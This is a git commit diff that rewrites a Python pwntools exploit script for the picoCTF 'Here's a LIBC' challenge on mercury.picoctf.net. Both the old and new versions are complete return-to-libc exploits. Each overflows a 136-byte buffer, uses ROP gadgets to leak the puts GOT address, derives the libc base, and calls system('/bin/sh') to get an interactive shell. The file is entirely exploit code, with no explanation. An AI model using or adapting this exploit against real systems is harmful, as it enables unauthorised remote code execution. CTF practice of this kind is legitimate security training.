4cb1dcfc9682fb22fc27f8dd2bf3f2c845702410
Ngab-Rio <150087614+Ngab-Rio@users.noreply.github.com>
2024-08-16 19:29:53 +0700

    Update so.py

--- herelibc/so.py
+++ herelibc/so.py
@@ -1,53 +1,26 @@
 from pwn import *
-p = remote('mercury.picoctf.net', 1774)
-elf = ELF("./vuln")
+
+p = remote("mercury.picoctf.net", 1774)
+elf = context.binary = ELF("./vuln")
 libc = ELF("./libc.so.6")
+
 rop = ROP(elf)
 
-PUTS = elf.plt['puts']
-MAIN = elf.symbols['main']
-LIBC_START_MAIN = elf.symbols['__libc_start_main']
+offset = 136
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
 
-POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
-RET = (rop.find_gadget(['ret']))[0]
+payload = b"a"*offset + p64(pop_rdi) +p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
 
-log.info("puts@plt: " + hex(PUTS))
-log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
-log.info("pop rdi gadget: " + hex(POP_RDI))
-
-#create the first rop chain to leak libc address
-JUNK = ("A"*136).encode()
-rop = JUNK
-rop += p64(POP_RDI)
-rop += p64(LIBC_START_MAIN)
-rop += p64(PUTS)
-rop += p64(MAIN)
-
-p.sendlineafter("sErVeR!", rop)
+p.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)
 
 p.recvline()
 p.recvline()
+addr = u64(p.recvline().rstrip().ljust(8, b'\x00'))
+log.info(f"ADDR {hex(addr)}")
+libc.address = addr - 0x80a30
+log.info(f"LIBC {hex(libc.address)}")
 
-leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
-
-
-libc.address = leak - libc.sym["__libc_start_main"]
-log.info("Address of libc %s " % hex(libc.address))
-
-#second rop chain to jump to /bin/sh
-rop2 = JUNK
-rop2 += p64(RET)
-rop2 += p64(POP_RDI)
-rop2 += p64(libc.address + 0x4f3c2)
-
-#found by using one_gadget /bin/sh
-#0x4f365
-#0x4f3c2
-#0x10a45c
-
-rop2 += p64(leak)
-
-p.sendlineafter("sErVeR!", rop2)
-
+payload = b"a"*offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
+p.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)
 p.interactive()
